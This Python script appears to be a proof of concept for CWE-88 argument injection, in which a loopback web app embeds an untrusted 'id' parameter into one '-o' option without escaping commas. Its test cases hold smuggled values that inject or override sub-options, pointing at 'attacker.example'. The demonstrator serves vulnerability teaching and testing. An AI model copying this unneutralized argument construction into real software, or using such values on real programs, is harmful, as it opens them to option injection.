#!/usr/bin/env python3

"""Product-independent CWE-88 embedded sub-option injection demonstrator (web intake).

This version models the *front-end intake* explicitly: an externally controlled
value arrives as an HTTP request parameter and crosses a trust boundary into a
small web application. The web application is the CWE-88 weak product: it embeds
that field into ONE OS-level option-argument and invokes a helper with a
structured argument list and ``shell=False``. The receiving demo_target program
then reparses that single argument as a comma-delimited sub-option language.

Data flow (trust boundary marked with ``||``):

    simulated external requester  ||  web application (constructs argument)  ->  demo_target
      GET /run?id=<UNTRUSTED>     ||  -o "endpoint=trusted.example,id=<...>"  ->  getsubopt()

The web parameter is only a representative untrusted source. What matters for
CWE-88 is that the constructing product forwards externally controlled data into
a single argument WITHOUT neutralizing the sub-option delimiter. Input
validation of arbitrary business content is not the point; delimiter
neutralization during argument construction is.

Reproduction is deterministic and dependency-free: a minimal HTTP client (the
simulated external requester) and the vulnerable web application are co-located
in one process, but the untrusted value still crosses a real HTTP
request-parameter boundary over a loopback socket. There is no external network
egress, no shell, and no vendor code. The strings ``trusted.example`` and
``attacker.example`` are documentation-only reserved names.
"""

from __future__ import annotations

import argparse
import http.server
import pathlib
import subprocess
import sys
import threading
import urllib.parse
import urllib.request

# Case name -> value supplied by the simulated external requester.
CASES = {
    "control": "42",
    "inject-new": "42,log_target=attacker.example",
    "override": "42,endpoint=attacker.example",
}


def build_option_argument(external_value: str) -> str:
    """The vulnerable construction being generalized.

    The web application embeds an externally controlled field into a single
    ``-o`` option-argument whose receiver defines a comma-delimited mini-language,
    WITHOUT neutralizing the delimiter. A correct implementation would reject or
    escape sub-option delimiters in ``external_value`` here.
    """
    return f"endpoint=trusted.example,id={external_value}"


class IntakeHandler(http.server.BaseHTTPRequestHandler):
    """Minimal web endpoint that receives one untrusted field and forwards it."""

    def log_message(self, *args):  # noqa: D401 - silence default stderr logging
        return

    def do_GET(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path != "/run":
            self.send_error(404, "not found")
            return

        query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        id_values = query.get("id")
        if not id_values:
            self.send_error(400, "missing id parameter")
            return

        # Untrusted field, straight off the HTTP request. This is the intake that
        # crosses the trust boundary into the web application.
        external_value = id_values[0]

        option_argument = build_option_argument(external_value)

        # Important: the outer OS argument vector is preserved. There are exactly
        # three argv elements and no shell parses this command line.
        command = [self.server.target, "-o", option_argument]  # type: ignore[attr-defined]
        completed = subprocess.run(
            command, shell=False, check=False, capture_output=True, text=True
        )

        lines = [
            "[web] method=GET",
            "[web] path=/run",
            f"[web] request_param id=<{external_value}>",
            "[web] delimiter_neutralization=none",
            f"[web] constructed option_argument=<{option_argument}>",
            f"[web] subprocess argv elements={len(command)}",
            "[web] shell=False",
            f"[web] target_returncode={completed.returncode}",
            "[web] --- target output ---",
        ]
        body = "\n".join(lines) + "\n" + completed.stdout
        if completed.stderr:
            body += completed.stderr

        data = body.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("X-Target-Returncode", str(completed.returncode))
        self.end_headers()
        self.wfile.write(data)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("case", choices=CASES)
    parser.add_argument(
        "--target",
        default=str(pathlib.Path(__file__).with_name("demo_target")),
        help="path to the locally built demo_target binary",
    )
    args = parser.parse_args()

    external_value = CASES[args.case]

    # Vulnerable web application bound to loopback on an ephemeral port. No
    # external network egress is possible.
    httpd = http.server.HTTPServer(("127.0.0.1", 0), IntakeHandler)
    httpd.target = args.target  # type: ignore[attr-defined]
    _, port = httpd.server_address
    server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    server_thread.start()

    query = urllib.parse.urlencode({"id": external_value})
    url = f"http://127.0.0.1:{port}/run?{query}"

    print(f"[client] case={args.case}")
    print("[client] role=simulated external requester (attacker-controlled input)")
    print(f"[client] external_value=<{external_value}>")
    print(f"[client] request=GET {url}")
    print("[client] --- web application response ---")
    sys.stdout.flush()

    try:
        with urllib.request.urlopen(url) as response:  # noqa: S310 - loopback only
            payload = response.read().decode()
            returncode = int(response.headers.get("X-Target-Returncode", "0"))
    finally:
        httpd.shutdown()
        httpd.server_close()

    sys.stdout.write(payload)
    if not payload.endswith("\n"):
        sys.stdout.write("\n")
    return returncode


if __name__ == "__main__":
    sys.exit(main())
